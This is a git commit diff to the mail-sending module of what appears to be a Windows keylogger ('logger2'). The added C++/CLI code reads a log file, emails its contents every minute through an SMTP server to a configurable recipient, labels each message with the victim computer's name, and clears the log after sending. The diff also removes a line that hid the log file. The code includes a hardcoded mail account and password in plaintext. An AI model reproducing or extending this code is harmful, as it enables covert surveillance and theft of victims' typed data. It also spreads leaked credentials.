8aef346e8bdc3692635ec8e946f81599e2dd8579
kolyabamberg <kolyabamberg@gmail.com>
2017-05-26 01:58:06 +0300

    send msg each minutes

--- logger2/logger/sendmail.cpp
+++ logger2/logger/sendmail.cpp
@@ -1,6 +1,7 @@
 #include "header.h"
 
 MSG message;
+BOOL isLastSend = true;
 
 void msgLoop()
 {
@@ -18,15 +19,18 @@ static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e)
 	String^ token = (String^)e->UserState;
 	if (e->Cancelled)
 	{
-		Console::WriteLine("[{0}] Send canceled.", token);
+		isLastSend = false;
+		//Console::WriteLine("[{0}] Send canceled.", token);
 	}
 	if (e->Error != nullptr)
 	{
+		isLastSend = false;
 		Console::WriteLine("[{0}] {1}", token,
 			e->Error->ToString());
 	}
 	else
 	{
+		isLastSend = true;
 		Console::WriteLine("Message sent.");
 	}
 	mailSent = true;
@@ -37,30 +41,59 @@ unsigned _stdcall sendFileFun(void* pArguments)
 	client->EnableSsl = true;
 	client->DeliveryMethod = SmtpDeliveryMethod::Network;
 	client->Credentials = gcnew System::Net::NetworkCredential("testforname@mail.ru", "chidori67");
-	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",
-		"Good" + "Luck",
-		System::Text::Encoding::UTF8);
-	MailAddress^ to = gcnew MailAddress("testforname@mail.ru");
+	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",Global::nameComp, System::Text::Encoding::UTF8);
+	MailAddress^ to = gcnew MailAddress(Global::recPost);
 	MailMessage^ message = gcnew MailMessage(from, to);
-	while (stopThread) {
-		SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	while (stopThreadSendMail) {
 		std::ifstream log(logName, std::ios::app); //opens log file	
 		std::string* content = new std::string(std::istreambuf_iterator<char>(log), std::istreambuf_iterator<char>());
+		log.close();
+		if (log.tellg() >= 850 && (BOOL)isLastSend) {
+			std::ofstream logg(logName, std::ios::trunc);
+			logg.close();
+		}
 		message->Body = gcnew String(content->c_str());
 		message->BodyEncoding = System::Text::Encoding::UTF8;
 		client->SendCompleted += gcnew	SendCompletedEventHandler(SendCompletedCallback);
 		String^ userState = "test message1";
 		client->SendAsync(message, userState);
-		System::Threading::Thread::Sleep(5000);
+		Thread::Sleep(5000);
 		if (mailSent == false)
 		{
 			client->SendAsyncCancel();
 		}
 		message->Body = nullptr;
-		Thread::Sleep(10000);
+		Thread::Sleep(60000);
 	}
 	client = nullptr;
 	delete message;
 	_endthreadex(0);
 	return 0;
+}
+
+void toPostAnother(char* addr)
+{
+	if (std::strlen(addr) != 0) {
+		std::ofstream log(nPostFile, std::ios::trunc); //opens file with post rec
+		log << addr << std::endl;
+		log.close();
+	}
+	char temppost[50];
+	std::ifstream logg(nPostFile, std::ios::app);
+	logg.getline(temppost, 50);
+	if (!temppost[0]) {
+		logg.close();
+		return;
+	}
+	Global::recPost = gcnew System::String(temppost);
+	logg.close();
+}
+
+void getCompName()
+{
+	setlocale(0, "");
+	char buffer[256];
+	DWORD size = 256;
+	GetComputerNameA(buffer, &size);
+	Global::nameComp = gcnew System::String(buffer);
 }
